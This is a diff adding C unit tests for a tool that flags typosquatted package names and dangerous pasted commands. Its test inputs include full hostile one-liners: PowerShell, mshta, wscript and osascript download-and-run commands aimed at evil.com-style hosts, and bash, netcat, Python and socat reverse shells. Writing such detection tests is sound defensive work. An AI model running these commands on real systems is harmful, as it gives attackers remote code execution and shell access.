@@ -58,6 +58,13 @@ static void test_pkg_typosquat_cargo(void) {
           "should detect typosquat of serde");
 }
 
+static void test_pkg_typosquat_gem(void) {
+    TEST("Package: 'rai1s' (gem, digit substitution) → typosquat");
+    PackageVerdict v = hlse_check_package("rai1s", "gem");
+    CHECK(v.score >= 40 && v.n_matches > 0,
+          "should detect typosquat of rails");
+}
+
 static void test_pkg_safe_unrelated(void) {
     TEST("Package: 'mycompanylib' → no match (safe)");
     PackageVerdict v = hlse_check_package("mycompanylib", NULL);
@@ -117,6 +124,37 @@ static void test_paste_sudo_curl(void) {
     CHECK(v.score >= 60, "sudo + curl|bash is critical");
 }
 
+static void test_paste_clickfix_powershell(void) {
+    TEST("Paste: ClickFix PowerShell encoded → HIGH (P8)");
+    PasteVerdict v = hlse_check_paste(
+        "powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "should detect ClickFix PowerShell LOLBin");
+}
+
+static void test_paste_clickfix_mshta(void) {
+    TEST("Paste: ClickFix 'mshta http://...' → HIGH (P8)");
+    PasteVerdict v = hlse_check_paste("mshta http://evil.example/x.hta");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "should detect mshta remote execution");
+}
+
+static void test_paste_clickfix_case_insensitive(void) {
+    TEST("Paste: mixed-case 'PowerShell ... IEX' → HIGH (P8)");
+    PasteVerdict v = hlse_check_paste(
+        "PowerShell -NoP -W Hidden IEX(New-Object Net.WebClient).DownloadString('http://x')");
+    CHECK(v.signals & PASTE_WINDOWS_LOLBIN,
+          "case-insensitive match must fire");
+}
+
+static void test_paste_benign_powershell(void) {
+    TEST("Paste: benign 'Get-ChildItem -Encoding utf8' → SAFE (no P8 FP)");
+    PasteVerdict v = hlse_check_paste(
+        "powershell Get-ChildItem -Path . -Recurse -Encoding utf8");
+    CHECK(!(v.signals & PASTE_WINDOWS_LOLBIN),
+          "legit admin one-liner must not trip P8");
+}
+
 static void test_paste_base64(void) {
     TEST("Paste: 'echo ... | base64 -d | sh' → encoded payload");
     PasteVerdict v = hlse_check_paste(
@@ -136,6 +174,136 @@ static void test_paste_empty(void) {
     TEST("Paste: empty string → SAFE");
     PasteVerdict v = hlse_check_paste("");
     CHECK(v.score == 0, "empty is safe");
+}
+
+static void test_paste_wscript_remote(void) {
+    TEST("Paste: 'wscript http://evil.com/p.vbs' → P8 LOLBin");
+    PasteVerdict v = hlse_check_paste("wscript http://evil.com/payload.vbs");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "wscript remote execution must trigger P8");
+}
+
+static void test_paste_wmic_process(void) {
+    TEST("Paste: 'wmic process call create ...' → P8 LOLBin");
+    PasteVerdict v = hlse_check_paste(
+        "wmic process call create \"cmd.exe /c malware.bat\"");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "wmic process creation must trigger P8");
+}
+
+static void test_paste_iwr_download(void) {
+    TEST("Paste: 'powershell iwr http://evil.com/s.exe' → P8 LOLBin");
+    PasteVerdict v = hlse_check_paste(
+        "powershell -c \"iwr http://evil.com/stage2.exe -OutFile $env:TEMP\\s.exe\"");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "iwr download must trigger P8");
+}
+
+static void test_paste_appinstaller_uri(void) {
+    TEST("Paste: 'ms-appinstaller:?source=http://...' → P8 LOLBin");
+    PasteVerdict v = hlse_check_paste(
+        "start ms-appinstaller:?source=http://evil.com/malware.appinstaller");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "ms-appinstaller URI must trigger P8");
+}
+
+static void test_paste_node_eval(void) {
+    TEST("Paste: 'node -e ...' → P5 encoded payload");
+    PasteVerdict v = hlse_check_paste(
+        "node -e \"require('child_process').exec('id')\"");
+    CHECK(v.score >= 25 && (v.signals & PASTE_ENCODED_PAYLOAD),
+          "node -e one-liner must trigger P5");
+}
+
+static void test_paste_php_eval(void) {
+    TEST("Paste: 'php -r eval(base64_decode(...))' → P5");
+    PasteVerdict v = hlse_check_paste(
+        "php -r 'eval(base64_decode(\"c3lzdGVtKCdpZCcp\"));'");
+    CHECK(v.score >= 25 && (v.signals & PASTE_ENCODED_PAYLOAD),
+          "php -r one-liner must trigger P5");
+}
+
+static void test_paste_revshell_dev_tcp(void) {
+    TEST("Paste: bash /dev/tcp reverse shell → P9");
+    PasteVerdict v = hlse_check_paste(
+        "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1");
+    CHECK(v.score >= 60, "bash /dev/tcp must trigger P9 (score >= 60)");
+}
+
+static void test_paste_revshell_nc_e(void) {
+    TEST("Paste: netcat -e reverse shell → P9");
+    PasteVerdict v = hlse_check_paste("nc -e /bin/sh 192.168.1.100 4444");
+    CHECK(v.score >= 60, "nc -e reverse shell must trigger P9 (score >= 60)");
+}
+
+static void test_paste_revshell_python_socket(void) {
+    TEST("Paste: Python socket reverse shell → P9");
+    PasteVerdict v = hlse_check_paste(
+        "python3 -c 'import socket,os;s=socket.socket();"
+        "s.connect((\"1.2.3.4\",4444));"
+        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)'");
+    CHECK(v.score >= 60, "Python socket/os.dup2 must trigger P9 (score >= 60)");
+}
+
+static void test_paste_revshell_socat(void) {
+    TEST("Paste: socat reverse shell → P9");
+    PasteVerdict v = hlse_check_paste(
+        "socat TCP:192.168.1.100:4444 EXEC:/bin/bash,pty,stderr,setsid");
+    CHECK(v.score >= 60, "socat TCP/EXEC must trigger P9 (score >= 60)");
+}
+
+static void test_paste_osascript(void) {
+    TEST("Paste: osascript 'do shell script curl|bash' → P8 macOS ClickFix");
+    PasteVerdict v = hlse_check_paste(
+        "osascript -e 'do shell script \"curl http://evil.com/s | bash\"'");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "osascript must trigger P8");
+}
+
+static void test_paste_python_download_exec(void) {
+    TEST("Paste: python3 urllib.request exec → P8 download-execute");
+    PasteVerdict v = hlse_check_paste(
+        "python3 -c \"import urllib.request; exec(urllib.request.urlopen"
+        "('http://evil.com/s').read())\"");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "python download-exec must trigger P8");
+}
+
+/* ─── New package typosquat coverage (npm AI/LLM, pip LLM ecosystem) ──── */
+
+static void test_pkg_chromadb_npm(void) {
+    TEST("Package: 'chromadb_' (npm) → typosquat of chromadb");
+    PackageVerdict v = hlse_check_package("chromadb_", "npm");
+    CHECK(v.score >= 40 && v.n_matches > 0,
+          "chromadb_ must detect npm typosquat");
+}
+
+static void test_pkg_anthropic_npm(void) {
+    TEST("Package: 'anthropicc' (npm) → typosquat of anthropic");
+    PackageVerdict v = hlse_check_package("anthropicc", "npm");
+    CHECK(v.score >= 40 && v.n_matches > 0,
+          "anthropicc must detect npm typosquat");
+}
+
+static void test_pkg_wrangler_typo(void) {
+    TEST("Package: 'wranglr' (npm) → typosquat of wrangler");
+    PackageVerdict v = hlse_check_package("wranglr", "npm");
+    CHECK(v.score >= 40 && v.n_matches > 0,
+          "wranglr must detect npm typosquat of wrangler");
+}
+
+static void test_pkg_llamaindex_pip(void) {
+    TEST("Package: 'llama-indx' (pip) → typosquat of llama-index");
+    PackageVerdict v = hlse_check_package("llama-indx", "pip");
+    CHECK(v.score >= 40 && v.n_matches > 0,
+          "llama-indx must detect pip typosquat");
+}
+
+static void test_pkg_crewai_pip(void) {
+    TEST("Package: 'creawi' (pip) → typosquat of crewai");
+    PackageVerdict v = hlse_check_package("creawi", "pip");
+    CHECK(v.score >= 40 && v.n_matches > 0,
+          "creawi must detect pip typosquat of crewai");
 }
 
 /* ─── Network Safety ──────────────────────────────────────────────────── */
@@ -158,6 +326,7 @@ int main(void) {
     test_pkg_typosquat_missing();
     test_pkg_typosquat_npm();
     test_pkg_typosquat_cargo();
+    test_pkg_typosquat_gem();
     test_pkg_safe_unrelated();
     test_pkg_underscore_hyphen();
     test_pkg_all_ecosystems();
@@ -168,9 +337,32 @@ int main(void) {
     test_paste_hidden_newline();
     test_paste_rtl_override();
     test_paste_sudo_curl();
+    test_paste_clickfix_powershell();
+    test_paste_clickfix_mshta();
+    test_paste_clickfix_case_insensitive();
+    test_paste_benign_powershell();
     test_paste_base64();
     test_paste_history_evasion();
     test_paste_empty();
+    test_paste_wscript_remote();
+    test_paste_wmic_process();
+    test_paste_iwr_download();
+    test_paste_appinstaller_uri();
+    test_paste_osascript();
+    test_paste_python_download_exec();
+    test_paste_node_eval();
+    test_paste_php_eval();
+    test_paste_revshell_dev_tcp();
+    test_paste_revshell_nc_e();
+    test_paste_revshell_python_socket();
+    test_paste_revshell_socat();
+
+    printf("\nNew AI/LLM ecosystem package typosquats:\n");
+    test_pkg_chromadb_npm();
+    test_pkg_anthropic_npm();
+    test_pkg_wrangler_typo();
+    test_pkg_llamaindex_pip();
+    test_pkg_crewai_pip();
 
     printf("\nNetwork safety:\n");
     test_network_runs();
